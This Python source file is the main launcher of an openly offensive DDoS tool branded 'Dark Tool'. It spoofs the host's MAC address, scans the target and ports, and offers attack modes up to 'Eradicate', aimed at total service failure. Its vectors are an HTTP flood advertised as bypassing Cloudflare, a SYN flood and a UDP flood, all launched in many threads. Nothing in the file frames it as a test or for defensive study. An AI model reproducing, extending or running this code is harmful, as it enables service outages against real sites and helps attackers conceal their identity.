import sys
import time
import random
from urllib.parse import urlparse

from rich.console import Console

import config
from core.analyzer import TargetAnalyzer
from core.dashboard import launch_dashboard
from core.vectors import L7_HTTPFlood, L4_SYNFlood, L4_UDPFlood
from utils.system import initial_environment_check, manage_mac_address
from utils.resources import update_attack_resources

console = Console()

def display_main_banner():
    banner = """
██████╗   █████╗  ██████╗ ██╗  ██╗     ████████╗ ██████╗  ██████╗ ██╗     
██╔══██╗ ██╔══██╗ ██╔══██╗██║ ██╔╝     ╚══██╔══╝ ██╔══██╗██╔═══██╗██║     
██║  ██║ ███████║ ██████╔╝█████╔╝         ██║    ██████╔╝██║   ██║██║     
██║  ██║ ██╔══██║ ██╔══██╗██╔═██╗         ██║    ██╔══██╗██║   ██║██║     
██████╔╝ ██║  ██║ ██║  ██║██║  ██╗        ██║    ██║  ██║╚██████╔╝███████╗
╚═════╝  ╚═╝  ╚═╝ ╚═╝  ╚═╝╚═╝  ╚═╝        ╚═╝    ╚═╝  ╚═╝ ╚═════╝ ╚══════╝
    """
    console.print(f"[bold red]{banner}[/bold red]", justify="center")
    console.print(f"[bold cyan]Advanced Targeting System v{config.VERSION}[/bold cyan]", justify="center")
    console.print("-" * 70)

def main():
    display_main_banner()
    initial_environment_check()
    manage_mac_address('spoof', config.INTERFACE)
    update_attack_resources()
    
    try:
        target_url = console.input("[bold green]Enter Target URL: [/bold green]")
        if not urlparse(target_url).scheme: target_url = "http://" + target_url

        analyzer = TargetAnalyzer(target_url)
        analysis_results = analyzer.analyze()
        if not analysis_results or analysis_results.get('IP Address') == "Resolution Failed":
            console.print("[bold red]FATAL: Target unreachable or DNS resolution failed. Aborting.[/bold red]")
            sys.exit(1)
        target_ip = analysis_results['IP Address']

        console.print("\n[bold]Select Attack Mode:[/bold]")
        console.print("[1] Test     - Low-intensity probe to analyze defenses.")
        console.print("[2] Overload - High-traffic assault to degrade service performance.")
        console.print("[3] Eradicate - All-out multi-vector attack to cause total service failure.")
        mode = {"1": "Test", "2": "Overload", "3": "Eradicate"}.get(console.input("[bold green]Mode [1-3]: [/bold green]"), "Overload")

        console.print("\n[bold]Select Attack Vectors (e.g., 1,3):[/bold]")
        console.print("[1] L7 HTTP Flood [CF Bypass]")
        console.print("[2] L4 TCP SYN Flood")
        console.print("[3] L4 UDP Flood")
        vector_choices = console.input("[bold green]Vectors: [/bold green]").split(',')
        
        threads = int(console.input(f"[bold green]Threads (default {config.DEFAULT_THREADS}): [/bold green]") or str(config.DEFAULT_THREADS))
        
        open_ports = []
        if '2' in vector_choices or '3' in vector_choices:
            open_ports = analyzer.scan_ports()
            analyzer.display_report()
            if not open_ports: console.print("[bold yellow]Warning: No open ports found. L4 vectors may be ineffective.[/bold yellow]")

        console.print(f"\n[bold red on yellow]*** WARNING: INITIATING ATTACK ***[/bold red on yellow]")
        time.sleep(2)

        all_threads = []
        for _ in range(threads):
            choice = random.choice(vector_choices)
            if choice == '1':
                all_threads.append(L7_HTTPFlood(mode, target_url=target_url))
            elif choice == '2' and open_ports:
                all_threads.append(L4_SYNFlood(mode, target_ip=target_ip, target_port=random.choice(open_ports)))
            elif choice == '3':
                port = random.choice(open_ports) if open_ports else random.choice([80, 443, 53])
                all_threads.append(L4_UDPFlood(mode, target_ip=target_ip, target_port=port))
        
        if not all_threads:
            console.print("[bold red]FATAL: No valid attack vectors could be initialized. Aborting.[/bold red]")
            sys.exit(1)

        for t in all_threads: t.start()
        launch_dashboard(target_url, mode)

    except KeyboardInterrupt:
        console.print("\n[bold yellow]! Termination signal received...[/bold yellow]")
    except Exception as e:
        console.print(f"\n[bold red]FATAL RUNTIME ERROR: {e}[/bold red]",)
    finally:
        config.stop_event.set()
        console.print("[*] Shutting down all attack vectors...")
        time.sleep(2)
        manage_mac_address('restore', config.INTERFACE)
        console.print("[bold green]Operation terminated. Dark Tool signing off.[/bold green]")

if __name__ == "__main__":
    main()
